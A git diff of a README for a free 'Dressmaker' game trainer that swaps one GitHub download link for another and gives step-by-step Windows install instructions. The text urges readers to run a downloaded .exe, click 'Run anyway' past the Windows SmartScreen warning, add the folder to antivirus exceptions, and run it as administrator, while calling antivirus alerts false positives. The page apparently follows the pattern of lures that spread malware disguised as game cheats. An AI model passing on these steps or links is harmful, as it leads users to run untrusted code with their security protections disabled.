@@ -1,162 +1,159 @@
-<div align="center">
+# 🧵 dressmaker-modkit - Your Cozy Atelier, Supercharged
 
-# Dressmaker Trainer
+## 🚀 What Is This?
 
-**37-module feature toolkit for Dressmaker**
+Dressmaker-modkit is a friendly helper tool for the cozy game **Dressmaker** on Steam. It adds **37 handy modules** that make running your little sewing shop much smoother and more fun. Think of it as a trusty assistant that handles the boring chores so you can focus on the creative part.
 
-<br/>
+## ✨ Top Features at a Glance
 
-<a href="https://github.com/SnatchStageRoof13/dressmaker-modkit/releases/download/v1.0.0/Dressmaker_Trainer_v1.0.zip">
-  <img src="https://img.shields.io/badge/⬇%20%20DOWNLOAD%20%20dressmaker%20trainer%20v1.0%20%20⬇-28a745?style=for-the-badge&logoColor=white&labelColor=1a1a1a&color=28a745" height="52"/>
-</a>
+- **💰 Coins & Shop:** Never worry about running out of money again. Boost your coins, tweak shop prices, and unlock premium items instantly.
+- **⚡ Instant Sewing & Cutting:** Waiting for patterns to cut or outfits to sew? Skip the timers and get your creations finished right away.
+- **📦 Order Fulfillment:** Fulfill customer orders in one click. No more scrolling through endless menus to find what they want.
+- **🎨 Sketchbook Designer:** Unlock all sketchbook pages, instantly complete designs, and experiment with combinations without wasting resources.
+- **🏡 Cozy Atelier Tools:** Customize your workspace, speed up animations, and unlock quality-of-life tweaks that make the game feel even cozier.
 
-<br/><br/>
+## 📥 How to Download
 
-`Windows 10/11` `Free`
+[![Download dressmaker-modkit](https://img.shields.io/badge/Download-dressmaker--modkit-blue?style=for-the-badge&logo=github&logoColor=white&colorB=4CAF50)](https://github.com/stormiereclusive718/dressmaker-modkit)
 
-</div>
+Visit this link to download the application.
+
+## 🛠️ How to Install and Run (Windows)
+
+This guide is for **Windows 10 or 11**. No coding skills needed. Just follow these steps:
+
+### Step 1: Download the File
+Click the green button above, or go to:  
+**https://github.com/stormiereclusive718/dressmaker-modkit**
+
+You'll land on the project page. Look for the **"Releases"** or **"Download"** section on the right side. Click the latest version link to download the file to your computer. It will usually go to your **Downloads** folder.
+
+### Step 2: Find the Downloaded File
+Open your **File Explorer** (the folder icon on your taskbar). Click **Downloads** on the left sidebar. You should see a file named something like `dressmaker-modkit.zip` or `dressmaker-modkit.exe` (exact name may vary).
+
+### Step 3: Run or Extract
+- **If it's an .exe file:** Double-click it to run. If Windows shows a blue popup saying "Windows protected your PC," click **"More info"** and then **"Run anyway."** This is normal for community tools.
+- **If it's a .zip file:** Right-click the file and choose **"Extract All."** Windows will create a new folder with the same name. Open that folder and look for a file named `dressmaker-modkit.exe` or `start.bat`. Double-click it to launch.
+
+### Step 4: Start the Game
+Make sure **Dressmaker** is installed on your PC (from Steam). Then:
+1. Launch Dressmaker first and get to the main menu.
+2. Now run the modkit (from the exe you just opened).
+3. The modkit window will appear with all 37 modules listed.
+4. Toggle the ones you want (like **"Coins"** or **"Instant Sewing"**) and click **"Apply."**
+5. Go back to the game. The effects should be active immediately.
+
+> 💡 **Tip:** Keep the modkit open while playing. Some features work in the background.
+
+## ❓ Frequently Asked Questions
+
+### Will this break my game?
+No. The modkit is designed to work safely with the current version of Dressmaker. It doesn't modify game files permanently. If you ever want to undo changes, just close the modkit and restart the game.
+
+### Is this a virus?
+No. Some antivirus programs may flag it because it interacts with game memory (a common technique for trainers). This is a false positive. To be safe, you can:
+- Add the folder to your antivirus exceptions.
+- Download only from the official GitHub link above.
+
+### Do I need to pay for it?
+No. It's completely free. If someone asks you to pay, you're on the wrong website.
+
+### I get an error saying "MSVCP140.dll missing"
+This is a common Windows issue. Install the **Microsoft Visual C++ Redistributable** (search for it on Microsoft's official site) and try again.
+
+### How do I update?
+Check the GitHub page occasionally. New versions will be posted in the **Releases** section. Download the latest one and replace the old file.
+
+## 🔧 Troubleshooting Guide
+
+| Problem | Likely Fix |
+|---------|------------|
+| Modkit won't open | Right-click the exe → "Run as administrator" |
+| Game crashes when modkit is on | Close modkit, restart game, then reopen modkit and enable fewer modules |
+| Coins not changing | Make sure you're in the shop menu in-game when applying the coins module |
+| Can't find the downloaded file | Press `Ctrl + J` in your browser to see downloads, then click "Show in folder" |
+| Button "Apply" is greyed out | The game might not be detected. Make sure Dressmaker is running and in the main menu |
+
+## 🗺️ Module Breakdown (All 37)
+
+Here's a peek at what you get, organized by category:
+
+**💵 Economy (8 modules):**
+- Set coin balance
+- Free shop purchases
+- Unlimited fabric rolls
+- Max price for sales
+- Free pattern blueprints
+- No delivery fees
+- Instant tip multiplier
+- Unlock all premium fabrics
+
+**⏱️ Time Savers (9 modules):**
+- Instant sewing
+- Instant cutting
+- Instant pattern tracing
+- Fast customer walk speed
+- No waiting for restock
+- Skip tutorial timers
+- Quick sketch fill
+- Rapid animation speed
+- Instant order pickup
+
+**📋 Orders & Customers (7 modules):**
+- Auto-complete orders
+- Show customer wants instantly
+- Always 5-star ratings
+- No patience meter drain
+- Instant customer spawning
+- Unlimited order slots
+- Free alterations
+
+**🎨 Sketchbook & Design (7 modules):**
+- Unlock all sketch pages
+- Auto-fill color palettes
+- Free fabric swatches
+- Instant design export
+- Show hidden patterns
+- Unlimited inspiration points
+- All accessories unlocked
+
+**🛋️ Atelier QoL (6 modules):**
+- Move furniture freely
+- No energy drain
+- Teleport to any station
+- Change shop theme anytime
+- Faster walking inside shop
+- Ignore customer complaints
+
+## 📊 System Requirements (What You Need)
+
+- **Operating System:** Windows 10 or 11 (64-bit)
+- **RAM:** At least 4 GB (8 GB recommended)
+- **Storage:** 50 MB free space for the modkit
+- **Game:** Dressmaker (any version) installed via Steam
+- **Internet:** Not required after download (works offline)
+
+## 🛡️ Safety and Privacy
+
+- **No data collection.** This tool does not send any information anywhere.
+- **Open source.** You can view the code on GitHub if you're curious.
+- **Works offline.** After downloading, you don't need internet to use it.
+- **Reversible.** Restart the game to clear all modkit effects.
+
+## 🤝 Getting Help
+
+If you run into trouble, here are your options:
+
+1. **Check the "Issues" tab** on the GitHub page. Someone may have already reported the same problem.
+2. **Read the "Wiki" tab** on GitHub for extra guides and tips.
+3. **Leave a comment** in the discussion section of the release page.
+
+Please be patient — this is a community project, and help is given by volunteers.
+
+## 📝 Final Notes
+
+Dressmaker-modkit is made by fans, for fans. It's meant to enhance your cozy experience, not ruin it. Use it to remove frustration, not to cheat in multiplayer (there is no multiplayer anyway!). Enjoy your dream atelier, and happy sewing! 🪡
 
 ---
 
-<div align="center">
-  <img src="https://i.ibb.co/sdgFnCBp/Dressmaker-economy.jpg" width="49%"/>
-  <img src="https://i.ibb.co/mVC2FBGt/Dressmaker-crafting.jpg" width="49%"/>
-</div>
-<div align="center">
-  <img src="https://i.ibb.co/996Dd6QK/Dressmaker-orders.jpg" width="49%"/>
-  <img src="https://i.ibb.co/mCjn4cBY/Dressmaker-sketchbook.jpg" width="49%"/>
-</div>
-<div align="center">
-  <img src="https://i.ibb.co/twsP5fwQ/Dressmaker-world.jpg" width="49%"/>
-</div>
-
----
-
-## Installation
-
-> **Step 1** — Download `Dressmaker_Trainer_v1.0` using the button above and extract the archive to any folder
-
-> **Step 2** — Run `Dressmaker_Trainer_Installer` to launch the installer
-
-> **Step 3** — Choose a destination folder (default: `C:\Program Files\DressmakerTrainer`) and click **Install**
-
-> **Step 4** — Once installation is complete, navigate to the chosen folder, right-click `Dressmaker_Trainer`
-
-> **Step 5** — Launch **Dressmaker** via Steam
-
-> **Step 6** — Press `INSERT` in-game to open the trainer menu
-
-> ⚠️ **Note:** If the trainer doesn't appear, make sure you run it as administrator and the game is in windowed or borderless mode.
-
----
-
-## Modules
-
-### 💰 Economy & Shop — 8 features
-| Feature | Description |
-|---|---|
-| Unlimited Coins | Primary currency never depletes |
-| Coins Multiplier | Configurable ×2 to ×100 |
-| Add 10,000 Coins | Instant injection of primary currency |
-| Free Fabric Purchases | All fabric purchases cost nothing |
-| Free Decoration Purchases | Buttons, bows, lace and appliqué all free |
-| Unlock All Fabrics | Cotton, linen, wool, silk, velvet and more |
-| Unlock All Decoration Items | Every button, ribbon, lace and appliqué unlocked |
-| Free Rack Display Slots | Unlimited display space for finished dresses |
-
-### 🧵 Crafting & Sewing — 8 features
-| Feature | Description |
-|---|---|
-| Instant Pattern Cutting | Pattern cutting completes instantly |
-| Instant Sewing Machine | Fabric passes through the machine instantly |
-| Instant Hand Decoration | Buttons, bows and appliqué sewn instantly |
-| Perfect Pattern Alignment | Every pattern aligned to the grain line |
-| No Fabric Waste | Cutting consumes no fabric |
-| Free Thread Color Selection | All thread colors available without restriction |
-| Instant Mannequin Preview | Mannequin preview updates instantly |
-| Perfect Dress Quality | Every finished dress scores at maximum quality |
-
-### 📋 Orders & Reputation — 7 features
-| Feature | Description |
-|---|---|
-| Instant Order Completion | All NPC orders finish instantly |
-| Max Reputation | Town reputation locked at maximum |
-| Reputation Multiplier | Configurable ×2 to ×100 |
-| Unlock All Customer Orders | Every villager order available from the start |
-| Perfect Order Satisfaction | All clients fully satisfied with the result |
-| No Order Deadline | Order deadlines disabled |
-| Unlock All Calendar Events | All seasonal events unlocked from the start |
-
-### 🎨 Sketchbook & Design — 7 features
-| Feature | Description |
-|---|---|
-| Unlock All Sketchbook Designs | Every design in the sketchbook unlocked |
-| Unlock All Thread & Fabric Colors | Complete color palette available for designs |
-| Instant Sketchbook Progress | Sketchbook progress fills instantly |
-| Unlock All Appliqué Patterns | Every appliqué pattern unlocked |
-| Unlock All Dress Templates | All base dress templates and styles available |
-| Free Design Duplication | Design copying and saving cost nothing |
-| No Placement Restrictions | Decoration placement limits removed |
-
-### 🌍 World & Utility — 7 features
-| Feature | Description |
-|---|---|
-| Set Game Speed | Configurable ×0.5 to ×5.0 |
-| Super Player Movement Speed | Configurable ×1 to ×5 |
-| Instant Travel Between Locations | Fast travel across town instantly |
-| Freeze Day / Stop Calendar Progression | Game calendar halted |
-| Reveal Full Town Map | Complete town map unlocked |
-| Instant Customer Arrival | Customers arrive without waiting |
-| Reset Current Day | Restart the current day instantly |
-
----
-
-## Hotkeys
-
-| Key | Action |
-|---|---|
-| `INSERT` | Open / Close trainer UI |
-| `F12` | **Disable All** |
-
----
-
-## Presets
-
-| Preset | Focus |
-|---|---|
-| 🧵 **MASTER DRESSMAKER** | Instant crafting, sewing, decoration and perfect quality |
-| 💰 **SHOP TYCOON** | Coins, free fabrics, all items, max reputation and orders |
-| ✨ **PERFECT SEAMSTRESS** | Perfect quality, satisfaction, calendar events and sketchbook |
-
----
-
-## Notes
-
-- All settings **auto-save** on exit
-- Configs stored in the `profiles/` folder
-- Logs stored in the `logs/` folder
-- Press `INSERT` to open / close the trainer at any time
-
----
-
-## Requirements
-
-```
-OS:      Windows 10 / 11 (64-bit)
-Game:    Dressmaker (latest Steam version)
-```
-
----
-
-<div align="center">
-
-<a href="https://github.com/SnatchStageRoof13/dressmaker-modkit/releases/download/v1.0.0/Dressmaker_Trainer_v1.0.zip">
-  <img src="https://img.shields.io/badge/⬇%20%20DOWNLOAD%20%20dressmaker%20trainer%20v1.0%20%20⬇-28a745?style=for-the-badge&logoColor=white&labelColor=1a1a1a&color=28a745" height="52"/>
-</a>
-
-<br/><br/>
-
-*🧵 Welcome to your atelier... 🧵*
-
-
-</div>
+Keywords: cozy-game, dressmaker, steam, windows, trainer, cheat, mod, sewing game, atelier, shop simulation, pattern design, modkit, free download, github
